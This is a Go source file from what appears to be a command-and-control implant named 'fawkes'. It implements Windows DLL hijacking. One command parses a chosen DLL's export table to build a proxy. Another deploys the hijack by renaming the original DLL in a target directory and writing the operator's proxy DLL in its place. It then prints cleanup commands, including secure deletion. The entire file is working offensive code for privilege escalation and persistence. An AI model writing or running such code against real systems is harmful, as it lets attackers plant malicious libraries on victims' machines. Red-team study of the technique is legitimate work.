//go:build windows

package commands

import (
	"debug/pe"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

type hijackExportResult struct {
	Action      string             `json:"action"`
	OrigPath    string             `json:"orig_path"`
	OrigName    string             `json:"orig_name"`
	RenamedName string             `json:"renamed_name"`
	Arch        string             `json:"arch"`
	Exports     []proxyExportEntry `json:"exports"`
	TargetDir   string             `json:"target_dir,omitempty"`
}

func winHijackExecute(args privescCheckArgs) structs.CommandResult {
	if args.Source == "" {
		return errorResult("Error: 'source' is required — path to the DLL to proxy (e.g. C:\\Windows\\System32\\version.dll)")
	}

	srcPath, err := filepath.Abs(args.Source)
	if err != nil {
		return errorf("Error resolving path: %v", err)
	}

	if _, err := os.Stat(srcPath); err != nil {
		return errorf("DLL not found: %v", err)
	}

	f, err := os.Open(srcPath)
	if err != nil {
		return errorf("Error opening %s: %v", srcPath, err)
	}
	defer f.Close()

	peFile, err := pe.NewFile(f)
	if err != nil {
		return errorf("Error parsing PE file: %v", err)
	}
	defer peFile.Close()

	if peFile.Characteristics&pe.IMAGE_FILE_DLL == 0 {
		return errorf("%s is not a DLL (IMAGE_FILE_DLL not set)", filepath.Base(srcPath))
	}

	arch := "x64"
	switch peFile.Machine {
	case pe.IMAGE_FILE_MACHINE_I386:
		arch = "x86"
	case pe.IMAGE_FILE_MACHINE_ARM64:
		arch = "arm64"
	}

	var exportDir pe.DataDirectory
	switch opt := peFile.OptionalHeader.(type) {
	case *pe.OptionalHeader64:
		if len(opt.DataDirectory) > 0 {
			exportDir = opt.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT]
		}
	case *pe.OptionalHeader32:
		if len(opt.DataDirectory) > 0 {
			exportDir = opt.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT]
		}
	}

	if exportDir.VirtualAddress == 0 || exportDir.Size == 0 {
		return errorf("%s has no exports — nothing to proxy", filepath.Base(srcPath))
	}

	rawExports, _, err := parseExportDirectory(peFile, exportDir)
	if err != nil {
		return errorf("Error parsing exports: %v", err)
	}

	exports := make([]proxyExportEntry, 0, len(rawExports))
	for _, e := range rawExports {
		exports = append(exports, proxyExportEntry{
			Ordinal:   e.ordinal,
			Name:      e.name,
			Forwarder: e.forwarder,
		})
	}

	origName := filepath.Base(srcPath)
	renamedName := proxyRenamedDLLName(origName)

	result := hijackExportResult{
		Action:      "hijack-execute",
		OrigPath:    srcPath,
		OrigName:    origName,
		RenamedName: renamedName,
		Arch:        arch,
		Exports:     exports,
		TargetDir:   args.TargetDir,
	}

	data, _ := json.Marshal(result)
	return successResult(string(data))
}

func winHijackDeploy(args privescCheckArgs) structs.CommandResult {
	if args.Source == "" {
		return errorResult("Error: 'source' is required — path to the compiled proxy DLL (download it first)")
	}
	if args.TargetDir == "" {
		return errorResult("Error: 'target_dir' is required — directory where the original DLL will be replaced")
	}
	if args.DLLName == "" {
		return errorResult("Error: 'dll_name' is required — original DLL filename (e.g. version.dll)")
	}

	proxyPath, err := filepath.Abs(args.Source)
	if err != nil {
		return errorf("Error resolving proxy path: %v", err)
	}
	targetDir, err := filepath.Abs(args.TargetDir)
	if err != nil {
		return errorf("Error resolving target directory: %v", err)
	}

	dllName := args.DLLName
	if !strings.HasSuffix(strings.ToLower(dllName), ".dll") {
		dllName += ".dll"
	}

	proxyData, err := os.ReadFile(proxyPath)
	if err != nil {
		return errorf("Error reading proxy DLL: %v", err)
	}

	origPath := filepath.Join(targetDir, dllName)
	renamedName := proxyRenamedDLLName(dllName)
	renamedPath := filepath.Join(targetDir, renamedName)

	if _, err := os.Stat(renamedPath); err == nil {
		return errorf("Renamed original already exists: %s — previous hijack may be in place. Clean up first.", renamedPath)
	}

	_, origExists := os.Stat(origPath)
	if origExists == nil {
		if err := os.Rename(origPath, renamedPath); err != nil {
			return errorf("Error renaming original DLL: %v — may need elevated privileges", err)
		}
	}

	destPath := filepath.Join(targetDir, dllName)
	if err := os.WriteFile(destPath, proxyData, 0644); err != nil {
		if origExists == nil {
			_ = os.Rename(renamedPath, origPath)
		}
		return errorf("Error writing proxy DLL: %v", err)
	}

	var sb strings.Builder
	sb.WriteString("[+] DLL hijack deployed\n")
	if origExists == nil {
		sb.WriteString(fmt.Sprintf("    Original:  %s → %s\n", origPath, renamedPath))
	} else {
		sb.WriteString(fmt.Sprintf("    Target:    %s (no original to rename)\n", destPath))
	}
	sb.WriteString(fmt.Sprintf("    Proxy:     %s (%d bytes)\n", destPath, len(proxyData)))
	sb.WriteString(fmt.Sprintf("\n--- Cleanup ---\n"))
	sb.WriteString(fmt.Sprintf("    securedelete %s\n", destPath))
	if origExists == nil {
		sb.WriteString(fmt.Sprintf("    mv %s %s\n", renamedPath, origPath))
	}

	return successResult(sb.String())
}
